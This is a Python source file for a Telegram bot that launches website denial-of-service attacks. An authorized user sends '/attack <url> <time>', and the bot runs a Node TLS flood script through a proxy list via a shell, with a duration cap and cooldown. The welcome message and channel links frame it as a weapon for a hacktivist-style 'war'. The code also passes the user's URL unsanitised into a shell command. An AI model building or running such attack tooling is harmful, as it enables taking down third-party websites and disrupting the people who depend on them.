import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
import time

API_TOKEN = input("Enter your bot token: ")
AUTHORIZED_USER_ID = int(input("Enter your authorized user ID: "))
COOLDOWN_PERIOD = 120  # Cooldown period in seconds
MAX_DURATION = 500  # Maximum attack duration

bot = telebot.TeleBot(API_TOKEN)
last_attack_time = 0

# Start command handler
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id

    # Welcome message
    welcome_message = "Welcome! Brothers we have to win the war ! click /attack to start any problem feel free to contact me @BorNo_SixNine."

    # Video file (ensure the path to your video is correct)
    video = open('r.mp4', 'rb')

    # Creating the buttons
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("Telegram Channel", url="https://t.me/THE_ANON_6T9"),
        InlineKeyboardButton("Facebook Page", url="https://facebook.com/THEANON69BD")
    )

    # Send the welcome message, video, and buttons
    bot.send_video(chat_id, video, caption=welcome_message, reply_markup=markup)

# Attack command handler
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global last_attack_time
    chat_id = message.chat.id

    if message.from_user.id != AUTHORIZED_USER_ID:
        bot.send_message(chat_id, "You are not authorized to use this bot.")
        return

    current_time = time.time()
    if current_time - last_attack_time < COOLDOWN_PERIOD:
        remaining_cooldown = COOLDOWN_PERIOD - (current_time - last_attack_time)
        bot.send_message(chat_id, f"Please wait {remaining_cooldown:.1f} seconds before initiating another attack.")
        return

    try:
        # Split the message text to get the URL and time
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(chat_id, "Usage: /attack <url> <time>")
            return
        
        _, url, duration = parts
        duration = int(duration)
        
        if duration > MAX_DURATION:
            bot.send_message(chat_id, f"Maximum duration is {MAX_DURATION} seconds. Please specify a lower duration.")
            return

        # Construct the command to run on VPS
        command = f" node savebd/TLS {url} 64 15 {duration} savebd/proxy.txt"

        # Execute the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Update the last attack time
        last_attack_time = current_time

        # Send the result back to the user
        bot.send_message(chat_id, f"Command executed:\n{result.stdout}\n{result.stderr}")
    except ValueError:
        bot.send_message(chat_id, "Invalid duration format. Please provide a number.")
    except Exception as e:
        bot.send_message(chat_id, f"Error: {str(e)}")

# Start polling
bot.polling()